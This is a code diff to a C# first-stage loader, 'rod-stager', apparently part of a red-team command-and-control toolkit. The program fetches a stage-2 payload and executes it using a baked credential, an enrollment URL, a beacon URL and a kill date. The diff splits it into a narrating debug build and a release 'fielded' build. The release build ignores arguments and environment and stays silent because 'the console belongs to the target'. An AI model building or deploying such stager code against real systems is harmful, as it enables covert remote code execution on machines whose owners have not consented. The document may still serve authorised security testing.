@@ -6,9 +6,11 @@
 // evasion, no obfuscation, and no destructive behavior (architecture.md
 // Sec 7). The whole program is one fetch-and-exec -- the smallest footprint a
 // first-stage loader can honestly have: no protocol bindings, no packages, no
-// key material, and in the field no arguments at all (the bake carries the
-// fetch reference and the credential; flags and env only fill an unbaked
-// dev run and never override what was baked).
+// key material. The release build is the fielded shape: configuration is the
+// bake and nothing else, arguments and environment are ignored, and the
+// console stays silent beyond fatal one-liners. The debug build is the dev
+// shape: flags and env drive the checked-in empty profile stub, and the run
+// narrates.
 
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
@@ -27,6 +29,14 @@ internal static class StagerApp
             cts.Cancel();
         };
 
+        // The two builds of this binary: DEBUG is the dev shape -- flags and
+        // the ROD_* environment drive the checked-in empty BakedProfile stub,
+        // and the run narrates to stderr. RELEASE is the fielded shape --
+        // configuration is the bake and nothing else, arguments and
+        // environment are ignored entirely, and the console belongs to the
+        // target: narration is compiled out, with only the fatal one-liners
+        // (a failed fetch, a hash mismatch) still printing.
+#if DEBUG
         LoadBaked();
 
         string runtimeToken;
@@ -46,9 +56,8 @@ internal static class StagerApp
             return ex.ExitCode;
         }
 
-        // The bake is authoritative: a fielded loader cannot be re-pointed
-        // or re-credentialed through flags or the environment. Runtime
-        // values only fill an unbaked dev run.
+        // A bake, when one is present, overrides whatever the flags and env
+        // supplied -- the same authority the fielded shape runs under.
         if (BakedEnrollUrl.Length > 0)
             enrollUrl = BakedEnrollUrl;
         if (BakedPayloadId.Length > 0)
@@ -69,17 +78,32 @@ internal static class StagerApp
             Console.Error.WriteLine("rod-stager: a stage-2 payload id is required (-payload, or bake one into the artifact)");
             return 1;
         }
+
+        var log = Console.Error;
+#else
+        LoadBaked();
+
+        var enrollUrl = BakedEnrollUrl;
+        var payloadId = BakedPayloadId;
+        var token = BakedToken;
+        var outDir = Path.Combine(Path.GetTempPath(), "rod-stager-" + Guid.NewGuid().ToString("N"));
+        string? beaconUrl = null;
+        string? caCertPath = null;
+        if (enrollUrl.Length == 0 || payloadId.Length == 0 || token.Length == 0)
+        {
+            Console.Error.WriteLine(
+                "rod-stager: this release build carries no baked profile; field a pipeline-built artifact");
+            return 2;
+        }
+
+        var log = TextWriter.Null;
+#endif
+
         if (KillDatePassed())
         {
             Console.Error.WriteLine("rod-stager: kill date has passed; refusing to run");
             return 1;
         }
-
-        // The narration log: stderr while developing, a null sink when quiet
-        // (the -quiet flag, ROD_QUIET, or the bake's quiet key). Fatal paths
-        // below print regardless -- a loader that dies silently is
-        // undebuggable.
-        var log = Quiet ? TextWriter.Null : Console.Error;
 
         // The fetch rides the same anonymous listener enroll does, and it
         // spends one use of the loader's credential: the download gate is
@@ -171,12 +195,6 @@ internal static class StagerApp
 
     private static string BakedPayloadId { get; set; } = "";
 
-    // Quiet is read after the bake and the flags have both run, so either source
-    // turns it on (an explicit ROD_QUIET=0 preset before launch beats the bake).
-    private static bool Quiet =>
-        Environment.GetEnvironmentVariable("ROD_QUIET") is { Length: > 0 } v
-            && (v == "1" || v.Equals("true", StringComparison.OrdinalIgnoreCase));
-
     private static (string Token, string EnrollUrl, string PayloadId, string OutDir, string? BeaconUrl, string? CaCertPath) ParseArgs(
         string[] args)
     {
@@ -193,7 +211,7 @@ internal static class StagerApp
             {
                 case "-h" or "--help":
                     Console.Error.WriteLine(
-                        "usage: rod-stager -token <secret> [-enroll-url <url>] [-payload <guid>] [-beacon-url <host:port>] [-out-dir <dir>] [-ca-cert <pem>] [-quiet]");
+                        "usage: rod-stager -token <secret> [-enroll-url <url>] [-payload <guid>] [-beacon-url <host:port>] [-out-dir <dir>] [-ca-cert <pem>]");
                     throw new ExitProgramException(0, null);
                 case "-token" or "--token":
                     token = Value(args, ref i);
@@ -212,9 +230,6 @@ internal static class StagerApp
                     break;
                 case "-ca-cert" or "--ca-cert":
                     caCert = Value(args, ref i);
-                    break;
-                case "-quiet" or "--quiet":
-                    Environment.SetEnvironmentVariable("ROD_QUIET", "1");
                     break;
                 default:
                     throw new ExitProgramException(1, $"unknown flag {args[i]}");
@@ -241,10 +256,8 @@ internal static class StagerApp
     // Loads the build-time baked profile (the generated BakedProfile class)
     // into the fields the bake owns. Operational keys -- the fetch
     // reference and the credential -- never touch the environment, so a
-    // fielded loader cannot be re-pointed or re-credentialed; only the
-    // narration default seeds the environment, and only when unset.
-    // Malformed baked data is ignored -- a bad bake must not crash the
-    // loader.
+    // fielded loader cannot be re-pointed or re-credentialed. Malformed
+    // baked data is ignored -- a bad bake must not crash the loader.
     private static void LoadBaked()
     {
         var baked = BakedProfile.Json;
@@ -260,7 +273,6 @@ internal static class StagerApp
             BakedString(root, "token", value => BakedToken = value);
             BakedString(root, "stage2Sha256", value => ExpectedSha256 = value);
             BakedString(root, "killDate", value => BakedKillDate = value);
-            SetEnvIfPresent(root, "quiet", "ROD_QUIET");
         }
         catch
         {
@@ -276,17 +288,6 @@ internal static class StagerApp
             var s = value.GetString();
             if (!string.IsNullOrEmpty(s))
                 apply(s);
-        }
-    }
-
-    private static void SetEnvIfPresent(System.Text.Json.JsonElement root, string jsonKey, string envKey)
-    {
-        if (root.TryGetProperty(jsonKey, out var value)
-            && value.ValueKind == System.Text.Json.JsonValueKind.String)
-        {
-            var s = value.GetString();
-            if (!string.IsNullOrEmpty(s) && Environment.GetEnvironmentVariable(envKey) is null)
-                Environment.SetEnvironmentVariable(envKey, s);
         }
     }
 
